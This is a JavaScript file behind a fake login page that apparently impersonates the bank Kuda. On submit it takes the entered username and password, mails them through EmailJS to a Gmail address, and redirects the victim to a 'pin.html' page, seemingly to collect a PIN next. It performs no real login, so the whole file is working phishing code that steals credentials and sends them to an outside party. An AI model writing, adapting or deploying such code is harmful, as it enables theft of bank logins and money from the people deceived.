// emailjs.init("");
const username = document.querySelector("#username");
const password = document.querySelector("#password");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_v7kg7cm";
const userId = "w0Q6rGREdg2xRfoeb";
const templateId = "template_ien303e";
document.getElementById("login").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "logindetail1811@gmail.com",
    username: username.value,
    password: password.value,
  };
  console.log(emailParams);
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      username.value = "";
      password.value = "";
      location.href = "/lo-Kuda.xyz.github.io/pin.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
